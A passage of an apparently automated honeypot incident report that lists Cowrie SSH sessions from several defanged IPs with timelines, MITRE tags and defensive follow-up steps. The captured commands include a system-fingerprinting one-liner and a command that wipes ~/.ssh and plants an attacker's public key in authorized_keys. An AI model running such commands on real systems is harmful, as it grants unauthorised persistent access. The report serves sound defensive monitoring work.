| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:12` | `cowrie.command.input` |
| `2026-09-03 16:07:13` | `cowrie.log.closed` |
| `2026-09-03 16:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f38d9e286d7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:09 |
| **Last Seen** | 2026-09-03 16:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:09:22` | `cowrie.session.connect` |
| `2026-09-03 16:09:22` | `cowrie.client.version` |
| `2026-09-03 16:09:22` | `cowrie.client.kex` |
| `2026-09-03 16:09:23` | `cowrie.login.success` |
| `2026-09-03 16:09:24` | `cowrie.session.params` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.command.success` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.command.input` |
| `2026-09-03 16:09:24` | `cowrie.log.closed` |
| `2026-09-03 16:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-277863141f55

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:11 |
| **Last Seen** | 2026-09-03 16:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:11:38` | `cowrie.session.connect` |
| `2026-09-03 16:11:38` | `cowrie.client.version` |
| `2026-09-03 16:11:38` | `cowrie.client.kex` |
| `2026-09-03 16:11:39` | `cowrie.login.success` |
| `2026-09-03 16:11:40` | `cowrie.session.params` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.command.success` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.command.input` |
| `2026-09-03 16:11:40` | `cowrie.log.closed` |
| `2026-09-03 16:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5ac2a37f56

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:13 |
| **Last Seen** | 2026-09-03 16:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:13:51` | `cowrie.session.connect` |
| `2026-09-03 16:13:51` | `cowrie.client.version` |
| `2026-09-03 16:13:51` | `cowrie.client.kex` |
| `2026-09-03 16:13:52` | `cowrie.login.success` |
| `2026-09-03 16:13:52` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:13:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:13:52` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5421c860e20d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:13 |
| **Last Seen** | 2026-09-03 16:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:13:56` | `cowrie.session.connect` |
| `2026-09-03 16:13:56` | `cowrie.client.version` |
| `2026-09-03 16:13:56` | `cowrie.client.kex` |
| `2026-09-03 16:13:58` | `cowrie.login.success` |
| `2026-09-03 16:13:59` | `cowrie.session.params` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.command.success` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.command.input` |
| `2026-09-03 16:13:59` | `cowrie.log.closed` |
| `2026-09-03 16:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b7dfd8af37c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:14 |
| **Last Seen** | 2026-09-03 16:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:14:31` | `cowrie.session.connect` |
| `2026-09-03 16:14:31` | `cowrie.client.version` |
| `2026-09-03 16:14:31` | `cowrie.client.kex` |
| `2026-09-03 16:14:32` | `cowrie.login.success` |
| `2026-09-03 16:14:32` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:14:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:14:33` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:14:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f061a43da26b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:16 |
| **Last Seen** | 2026-09-03 16:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:16:19` | `cowrie.session.connect` |
| `2026-09-03 16:16:19` | `cowrie.client.version` |
| `2026-09-03 16:16:19` | `cowrie.client.kex` |
| `2026-09-03 16:16:20` | `cowrie.login.success` |
| `2026-09-03 16:16:21` | `cowrie.session.params` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.command.success` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.command.input` |
| `2026-09-03 16:16:21` | `cowrie.log.closed` |
| `2026-09-03 16:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-115376da65d3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 16:18 |
| **Last Seen** | 2026-09-03 16:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:18:44` | `cowrie.session.connect` |
| `2026-09-03 16:18:44` | `cowrie.client.version` |
| `2026-09-03 16:18:44` | `cowrie.client.kex` |
| `2026-09-03 16:18:45` | `cowrie.login.success` |
| `2026-09-03 16:18:46` | `cowrie.session.params` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.command.success` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.command.input` |
| `2026-09-03 16:18:46` | `cowrie.log.closed` |
| `2026-09-03 16:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-821f7f1c6059

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:23 |
| **Last Seen** | 2026-09-03 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:23:20` | `cowrie.session.connect` |
| `2026-09-03 16:23:20` | `cowrie.client.version` |
| `2026-09-03 16:23:21` | `cowrie.client.kex` |
| `2026-09-03 16:23:21` | `cowrie.login.success` |
| `2026-09-03 16:23:22` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:23:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:23:22` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b743f7d01b57

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 16:23 |
| **Last Seen** | 2026-09-03 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:23:58` | `cowrie.session.connect` |
| `2026-09-03 16:23:58` | `cowrie.client.version` |
| `2026-09-03 16:23:59` | `cowrie.client.kex` |
| `2026-09-03 16:23:59` | `cowrie.login.success` |
| `2026-09-03 16:23:59` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:23:59` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef03e6bcb02c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:25 |
| **Last Seen** | 2026-09-03 16:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:25:21` | `cowrie.session.connect` |
| `2026-09-03 16:25:21` | `cowrie.client.version` |
| `2026-09-03 16:25:22` | `cowrie.client.kex` |
| `2026-09-03 16:25:22` | `cowrie.login.success` |
| `2026-09-03 16:25:23` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:25:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:25:23` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-606a9187f893

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-09-03 16:30 |
| **Last Seen** | 2026-09-03 16:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:30:06` | `cowrie.session.connect` |
| `2026-09-03 16:30:06` | `cowrie.client.version` |
| `2026-09-03 16:30:06` | `cowrie.client.kex` |
| `2026-09-03 16:30:07` | `cowrie.login.success` |
| `2026-09-03 16:30:08` | `cowrie.session.params` |
| `2026-09-03 16:30:08` | `cowrie.command.input` |
| `2026-09-03 16:30:08` | `cowrie.command.failed` |
| `2026-09-03 16:30:08` | `cowrie.log.closed` |
| `2026-09-03 16:30:09` | `cowrie.session.params` |
| `2026-09-03 16:30:09` | `cowrie.command.input` |
| `2026-09-03 16:30:09` | `cowrie.session.file_download` |
| `2026-09-03 16:30:09` | `cowrie.log.closed` |
| `2026-09-03 16:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255c82a00dd8

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-09-03 16:30 |
| **Last Seen** | 2026-09-03 16:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:30:09` | `cowrie.session.connect` |
| `2026-09-03 16:30:09` | `cowrie.client.version` |
| `2026-09-03 16:30:09` | `cowrie.client.kex` |
| `2026-09-03 16:30:10` | `cowrie.login.success` |
| `2026-09-03 16:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a7c83b13f8

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-09-03 16:30 |
| **Last Seen** | 2026-09-03 16:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:30:10` | `cowrie.session.connect` |
| `2026-09-03 16:30:10` | `cowrie.client.version` |
| `2026-09-03 16:30:10` | `cowrie.client.kex` |
| `2026-09-03 16:30:11` | `cowrie.login.success` |
| `2026-09-03 16:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af8e29f6896a

| Field | Detail |
|---|---|
| **Source IP** | `75.119.149[.]212` |
| **First Seen** | 2026-09-03 16:30 |
| **Last Seen** | 2026-09-03 16:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:30:18` | `cowrie.session.connect` |
| `2026-09-03 16:30:18` | `cowrie.client.version` |
| `2026-09-03 16:30:18` | `cowrie.client.kex` |
| `2026-09-03 16:30:19` | `cowrie.login.success` |
| `2026-09-03 16:30:20` | `cowrie.session.params` |
| `2026-09-03 16:30:20` | `cowrie.command.input` |
| `2026-09-03 16:30:20` | `cowrie.command.failed` |
| `2026-09-03 16:30:20` | `cowrie.log.closed` |
| `2026-09-03 16:30:21` | `cowrie.session.params` |
| `2026-09-03 16:30:21` | `cowrie.command.input` |
| `2026-09-03 16:30:21` | `cowrie.session.file_download` |
| `2026-09-03 16:30:21` | `cowrie.log.closed` |
| `2026-09-03 16:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.119.149[.]212` to AbuseIPDB if not already reported
- [ ] Block `75.119.149[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb247e3907f

| Field | Detail |
|---|---|
| **Source IP** | `75.119.149[.]212` |
| **First Seen** | 2026-09-03 16:30 |
| **Last Seen** | 2026-09-03 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:30:21` | `cowrie.session.connect` |
| `2026-09-03 16:30:21` | `cowrie.client.version` |
| `2026-09-03 16:30:21` | `cowrie.client.kex` |
| `2026-09-03 16:30:22` | `cowrie.login.success` |
| `2026-09-03 16:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.119.149[.]212` to AbuseIPDB if not already reported
- [ ] Block `75.119.149[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65fbb5bb3169

| Field | Detail |
|---|---|
| **Source IP** | `75.119.149[.]212` |
| **First Seen** | 2026-09-03 16:30 |
| **Last Seen** | 2026-09-03 16:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:30:22` | `cowrie.session.connect` |
| `2026-09-03 16:30:22` | `cowrie.client.version` |
| `2026-09-03 16:30:22` | `cowrie.client.kex` |
| `2026-09-03 16:30:23` | `cowrie.login.success` |
| `2026-09-03 16:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.119.149[.]212` to AbuseIPDB if not already reported
- [ ] Block `75.119.149[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7713f84eb3ab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:32 |
| **Last Seen** | 2026-09-03 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:32:47` | `cowrie.session.connect` |
| `2026-09-03 16:32:47` | `cowrie.client.version` |
| `2026-09-03 16:32:47` | `cowrie.client.kex` |
| `2026-09-03 16:32:48` | `cowrie.login.success` |
| `2026-09-03 16:32:48` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:32:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:32:49` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-905eeffea470

| Field | Detail |
|---|---|
| **Source IP** | `187.207.48[.]99` |
| **First Seen** | 2026-09-03 16:32 |
| **Last Seen** | 2026-09-03 16:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
